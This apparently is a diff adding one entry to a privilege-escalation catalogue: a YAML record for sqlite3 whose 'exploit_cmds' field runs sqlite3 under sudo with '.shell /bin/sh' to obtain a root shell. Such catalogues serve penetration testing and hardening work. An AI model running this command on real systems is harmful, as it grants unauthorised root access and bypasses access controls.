@@ -1,0 +1,4 @@
+name: sqlite3
+binary_path: /usr/bin/sqlite3
+exploit_cmds:
+- sudo /usr/bin/sqlite3 /dev/null '.shell /bin/sh'
